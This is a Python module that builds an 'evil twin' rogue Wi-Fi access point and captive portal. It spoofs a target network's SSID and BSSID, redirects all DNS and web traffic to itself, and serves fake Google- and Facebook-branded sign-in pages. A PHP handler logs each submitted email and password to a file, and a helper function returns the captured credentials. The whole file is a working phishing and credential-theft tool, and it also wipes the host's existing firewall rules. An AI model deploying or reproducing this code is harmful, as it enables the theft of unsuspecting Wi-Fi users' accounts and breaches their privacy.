"""
Evil Twin and Captive Portal Module
Provides functionality for creating rogue access points and captive portals
"""

import asyncio
import os
import subprocess
from typing import Optional, Dict, Tuple
import shutil

class EvilTwinManager:
    """Manager for Evil Twin attacks and captive portals"""
    
    def __init__(self):
        self.active_aps = {}
        self.check_dependencies()
    
    def check_dependencies(self) -> Dict[str, bool]:
        """Check if required tools are available"""
        tools = {
            'hostapd': self._check_command('hostapd'),
            'dnsmasq': self._check_command('dnsmasq'),
            'apache2': self._check_command('apache2') or self._check_command('nginx'),
            'iptables': self._check_command('iptables'),
        }
        return tools
    
    def _check_command(self, command: str) -> bool:
        """Check if a command is available"""
        return shutil.which(command) is not None
    
    async def create_evil_twin(self, interface: str, ssid: str, channel: int,
                              target_mac: Optional[str] = None) -> Tuple[bool, str, str]:
        """Create an evil twin access point"""
        try:
            ap_id = f"evil_twin_{ssid.replace(' ', '_')}_{channel}"
            
            # Create hostapd configuration
            config_file = f"/tmp/hostapd_{ap_id}.conf"
            self._create_hostapd_config(config_file, interface, ssid, channel, target_mac)
            
            # Start hostapd
            process = await asyncio.create_subprocess_exec(
                'hostapd',
                config_file,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Store AP information
            self.active_aps[ap_id] = {
                'process': process,
                'interface': interface,
                'ssid': ssid,
                'channel': channel,
                'config_file': config_file,
                'type': 'evil_twin'
            }
            
            return True, f"Evil twin AP created: {ssid}", ap_id
        except Exception as e:
            return False, str(e), None
    
    def _create_hostapd_config(self, config_file: str, interface: str, 
                               ssid: str, channel: int, mac: Optional[str] = None):
        """Create hostapd configuration file"""
        config = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=0
"""
        if mac:
            config += f"bssid={mac}\n"
        
        with open(config_file, 'w') as f:
            f.write(config)
    
    async def create_captive_portal(self, interface: str, ssid: str, channel: int,
                                   portal_type: str = "google") -> Tuple[bool, str, str]:
        """Create a captive portal"""
        try:
            ap_id = f"captive_{ssid.replace(' ', '_')}_{channel}"
            
            # 1. Create hostapd config
            config_file = f"/tmp/hostapd_{ap_id}.conf"
            self._create_hostapd_config(config_file, interface, ssid, channel)
            
            # 2. Start hostapd
            hostapd_process = await asyncio.create_subprocess_exec(
                'hostapd',
                config_file,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            await asyncio.sleep(2)  # Wait for AP to start
            
            # 3. Configure IP address for interface
            await self._run_command(f"ip addr add 10.0.0.1/24 dev {interface}")
            await self._run_command(f"ip link set {interface} up")
            
            # 4. Create dnsmasq configuration
            dnsmasq_config = f"/tmp/dnsmasq_{ap_id}.conf"
            self._create_dnsmasq_config(dnsmasq_config, interface)
            
            # 5. Start dnsmasq (DHCP + DNS)
            dnsmasq_process = await asyncio.create_subprocess_exec(
                'dnsmasq',
                '-C', dnsmasq_config,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # 6. Setup iptables for captive portal redirect
            await self._setup_iptables_redirect(interface)
            
            # 7. Setup web server for captive portal
            portal_dir = f"/tmp/portal_{ap_id}"
            self._create_portal_pages(portal_dir, portal_type, ssid)
            
            web_process = await self._start_portal_webserver(portal_dir, ap_id)
            
            # Store AP information
            self.active_aps[ap_id] = {
                'hostapd_process': hostapd_process,
                'dnsmasq_process': dnsmasq_process,
                'web_process': web_process,
                'interface': interface,
                'ssid': ssid,
                'channel': channel,
                'config_file': config_file,
                'dnsmasq_config': dnsmasq_config,
                'portal_dir': portal_dir,
                'type': 'captive_portal',
                'portal_type': portal_type,
                'credentials': []
            }
            
            return True, f"Captive portal created: {ssid} at 10.0.0.1", ap_id
        except Exception as e:
            return False, str(e), None
    
    def _create_dnsmasq_config(self, config_file: str, interface: str):
        """Create dnsmasq configuration"""
        config = f"""interface={interface}
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=10.0.0.1
address=/#/10.0.0.1
"""
        with open(config_file, 'w') as f:
            f.write(config)
    
    async def _setup_iptables_redirect(self, interface: str):
        """Setup iptables rules for captive portal"""
        commands = [
            "iptables -F",
            "iptables -t nat -F",
            f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80",
            f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80",
            f"iptables -t nat -A POSTROUTING -j MASQUERADE"
        ]
        
        for cmd in commands:
            await self._run_command(cmd)
    
    def _create_portal_pages(self, portal_dir: str, portal_type: str, ssid: str):
        """Create captive portal web pages"""
        os.makedirs(portal_dir, exist_ok=True)
        
        # Create index.html
        if portal_type == "google":
            html = self._get_google_portal_html(ssid)
        elif portal_type == "facebook":
            html = self._get_facebook_portal_html(ssid)
        else:
            html = self._get_generic_portal_html(ssid)
        
        with open(f"{portal_dir}/index.html", 'w') as f:
            f.write(html)
        
        # Create login handler PHP
        php_handler = self._get_login_handler_php(portal_dir)
        with open(f"{portal_dir}/login.php", 'w') as f:
            f.write(php_handler)
    
    def _get_google_portal_html(self, ssid: str) -> str:
        """Get Google-style captive portal HTML"""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Sign in to WiFi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {{
            font-family: Arial, sans-serif;
            background: #f1f3f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }}
        .container {{
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 30px;
        }}
        h1 {{
            font-size: 24px;
            margin: 0 0 10px 0;
            text-align: center;
        }}
        p {{
            color: #5f6368;
            text-align: center;
            margin-bottom: 30px;
        }}
        input {{
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
        }}
        button {{
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
        }}
        button:hover {{
            background: #1765cc;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="75" height="24" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
                <text x="0" y="18" font-family="Arial" font-size="20" fill="#4285F4" font-weight="bold">Google</text>
            </svg>
        </div>
        <h1>Sign in</h1>
        <p>to continue to {ssid}</p>
        <form method="POST" action="login.php">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
</body>
</html>"""
    
    def _get_facebook_portal_html(self, ssid: str) -> str:
        """Get Facebook-style captive portal HTML"""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {{
            font-family: Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }}
        .container {{
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
        }}
        .logo {{
            color: #1877f2;
            font-size: 48px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 20px;
        }}
        h2 {{
            text-align: center;
            margin-bottom: 20px;
        }}
        input {{
            width: 100%;
            padding: 14px;
            margin: 6px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 17px;
        }}
        button {{
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 20px;
            font-weight: bold;
            margin-top: 10px;
        }}
        button:hover {{
            background: #166fe5;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <h2>Connect to {ssid}</h2>
        <form method="POST" action="login.php">
            <input type="text" name="email" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>"""
    
    def _get_generic_portal_html(self, ssid: str) -> str:
        """Get generic captive portal HTML"""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>WiFi Authentication</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {{
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }}
        .container {{
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
        }}
        h1 {{
            text-align: center;
            color: #333;
            margin-bottom: 10px;
        }}
        p {{
            text-align: center;
            color: #666;
            margin-bottom: 30px;
        }}
        input {{
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 2px solid #e0e0e0;
            border-radius: 5px;
            box-sizing: border-box;
        }}
        button {{
            width: 100%;
            padding: 15px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            margin-top: 20px;
        }}
        button:hover {{
            background: #5568d3;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>WiFi Access</h1>
        <p>Please login to access {ssid}</p>
        <form method="POST" action="login.php">
            <input type="text" name="email" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>"""
    
    def _get_login_handler_php(self, portal_dir: str) -> str:
        """Get PHP login handler"""
        return f"""<?php
$credentials_file = '{portal_dir}/credentials.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    $timestamp = date('Y-m-d H:i:s');
    $entry = "[$timestamp] Email: $email | Password: $password\\n";
    
    file_put_contents($credentials_file, $entry, FILE_APPEND);
    
    // Redirect to success or actual internet
    header('Location: http://www.google.com');
    exit;
}}
?>"""
    
    async def _start_portal_webserver(self, portal_dir: str, ap_id: str) -> asyncio.subprocess.Process:
        """Start web server for captive portal"""
        # Use Python's simple HTTP server with CGI support
        process = await asyncio.create_subprocess_exec(
            'python3', '-m', 'http.server', '80',
            '--directory', portal_dir,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        return process
    
    async def _run_command(self, command: str):
        """Run a shell command"""
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await process.communicate()
    
    async def stop_ap(self, ap_id: str) -> Tuple[bool, str]:
        """Stop an access point or captive portal"""
        if ap_id not in self.active_aps:
            return False, "AP not found"
        
        ap = self.active_aps[ap_id]
        
        try:
            # Stop processes
            if 'process' in ap:
                ap['process'].terminate()
                await ap['process'].wait()
            
            if 'hostapd_process' in ap:
                ap['hostapd_process'].terminate()
                await ap['hostapd_process'].wait()
            
            if 'dnsmasq_process' in ap:
                ap['dnsmasq_process'].terminate()
                await ap['dnsmasq_process'].wait()
            
            if 'web_process' in ap:
                ap['web_process'].terminate()
                await ap['web_process'].wait()
            
            # Clean up files
            if 'config_file' in ap and os.path.exists(ap['config_file']):
                os.remove(ap['config_file'])
            
            if 'dnsmasq_config' in ap and os.path.exists(ap['dnsmasq_config']):
                os.remove(ap['dnsmasq_config'])
            
            # Clean up iptables
            await self._run_command("iptables -F")
            await self._run_command("iptables -t nat -F")
            
            del self.active_aps[ap_id]
            return True, "AP stopped successfully"
        except Exception as e:
            return False, str(e)
    
    def get_ap_info(self, ap_id: str) -> Optional[Dict]:
        """Get information about an AP"""
        return self.active_aps.get(ap_id)
    
    def get_captured_credentials(self, ap_id: str) -> list:
        """Get credentials captured by captive portal"""
        ap = self.active_aps.get(ap_id)
        if not ap or ap['type'] != 'captive_portal':
            return []
        
        cred_file = f"{ap['portal_dir']}/credentials.txt"
        if os.path.exists(cred_file):
            with open(cred_file, 'r') as f:
                return f.readlines()
        
        return []

# Global instance
evil_twin_manager = EvilTwinManager()
